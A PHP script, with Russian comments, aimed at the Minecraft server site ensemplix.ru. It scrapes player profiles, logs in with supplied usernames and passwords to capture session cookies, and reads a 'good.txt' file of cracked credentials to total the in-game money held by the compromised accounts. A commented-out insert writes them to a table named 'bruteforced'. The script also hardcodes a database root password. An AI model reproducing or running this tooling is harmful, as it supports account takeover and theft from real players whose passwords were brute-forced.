<?php
error_reporting(E_ALL ^ E_NOTICE);
set_time_limit(0);
$start = time();

function logg($mess, $status = 0)
{
if($status)
echo "\033[39;32m$mess\033[0m";
else
echo "\033[39;31m$mess\033[0m";
}

function parse($id)
{
//Загружаем страницу с профилем
$profile = file_get_contents('http://ensemplix.ru/profile/'.$id);

//Парсим данные профиля
$nick = grab('profile/'.$id.'/">', '</a></div><div', $profile);
if($nick){ //Проверка, существует ли профиль
$date_reg = grab('Дата регистрации: ', '<br />', $profile);
$date_lastplay = grab('Последний раз был в игре ', '<br />', $profile);
$money = round(grab('Баланс: ', '$<br />', $profile));
$job1 = str_replace(' LVL ', ':', grab('я #1: ', '<br />', $profile));
$job2 = str_replace(' LVL ', ':', grab('я #2: ', '<br />', $profile));

//Составляем массив с данными и возвращаем его
$info = array('id' => $id, 'nick' => $nick, 'reg' => $date_reg, 'play' => $date_lastplay, 'money' => $money, 'j1' => $job1, 'j2' => $job2);
return $info;
}
else return null;
}

function login($login, $password)
{
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL,'http://ensemplix.ru/auth.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'username='.$login.'&password='.$password.'&submit=Войти');
$result = curl_exec($ch);
curl_close($ch);
if(substr_count($result, 'error')>0) return null; else return grab('PHPSESSID=',';',$result);
}

function getpost($url, $cookie, $post = 0)
{
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL,'http://ensemplix.ru/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_POST, $post);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_COOKIE, 'PHPSESSID='.$cookie);
$result = curl_exec($ch);
curl_close($ch);
return $result;
}

function grab($from,$to,$source)
{
$temp = explode($from, $source);
$temp2 = explode($to, $temp[1]);
return $temp2[0];
}
#####################################################
$f = file('good.txt');
mysql_connect("localhost","root","ololena");
mysql_select_db('ensemplix');
foreach($f as $good)
{
$c++;
	$exploded = explode(':', $good);
	$pass = $exploded[1];
	$info = json_decode(base64_decode($exploded[2]));
	logg($info->nick."\n", 1);
	$money += $info->money;
	//$sql = "INSERT INTO `bruteforced` (`id`, `nick`, `pass`, `regdate`, `playdate`, `money`, `job1`, `job2`) VALUES (NULL, '".$info->nick."', '".$pass."', '".$info->reg."', '".$info->play."', '".$info->money."', '".$info->j1."', '".$info->j2."');";
	//mysql_query($sql);
}
logg($money, 1);
##################
$now = time();
echo $now-$start.' seconds'."\n";
?>